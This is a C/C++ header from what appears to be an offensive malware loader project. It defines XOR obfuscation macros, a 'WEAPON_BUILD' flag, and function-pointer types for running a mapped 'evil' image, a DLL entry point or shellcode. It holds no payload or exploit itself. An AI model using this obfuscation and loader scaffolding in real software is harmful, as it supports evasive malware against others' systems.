#pragma once

#include "spraygen.h"
#include <windows.h>

// Obfuscation
#define OBFUSCATION_WORD (LOWORD(OBFUSCATION_DWORD))
#define OBFUSCATION_BYTE (LOBYTE(OBFUSCATION_WORD))
#define ObfDw(dw) (dw ^ OBFUSCATION_DWORD) ^ Z(cmn_obf_dword)

#define ObfEncB(b) (b ^ OBFUSCATION_BYTE)
#define ObfEncW(w) (w ^ OBFUSCATION_WORD)
#define ObfEncDw(d) (d ^ OBFUSCATION_DWORD)

#define ObfDecB(b) ObfEncB(b)
#define ObfDecW(w) ObfEncW(w)
#define ObfDecDw(d) ObfEncDw(d)

#define ObfEncode(a) ((decltype(a)*)((size_t)a ^ OBFUSCATION_DWORD))
#define ObfDecode(a) ObfEncode(a)


// Common utilities
#ifdef _USRDLL
#define GET_HINSTANCE() (Z(g_hDll))
#else
#define GET_HINSTANCE() GetModuleHandleA(NULL)
#endif

#ifndef _DEBUG
#ifdef SPRAYED_BUILD
#define WEAPON_BUILD
#endif
#endif


// Common types
#define PAGE_SIZE 4096
#define PAGE_GRANULARITY 65536 // 0x10000
#define STATUS_SUCCESS 0
#define ALIGN_DOWN(p, n) ((uintptr_t)(p) - ( (uintptr_t)(p) % (uintptr_t)(n) ))
#define ALIGN_UP(p, n)   ALIGN_DOWN((uintptr_t)(p) + (uintptr_t)(n) - 1, (n))

typedef DWORD(__cdecl* LPFN_P2Code)(
  LPVOID lpImage, DWORD dwP2CodeFlags, DWORD dwP2CodePostCallRva,
  PVOID* ppEvilMapped);


typedef BOOL(WINAPI* LPFN_DllMain)(HMODULE, DWORD, LPVOID);
typedef VOID*(*LPFN_ExeEntry)();
typedef VOID*(*LPFN_shellcode)();


EXTERN_ZVAR(DWORD cmn_obf_dword);
EXTERN_ZVAR(HMODULE g_hDll);
EXTERN_ZVAR(HMODULE g_hKernel32);
EXTERN_ZVAR(HMODULE g_hEvil);
EXTERN_ZVAR(DWORD g_dwP2Ret);

SPRAYABLE_PROC(common_init);



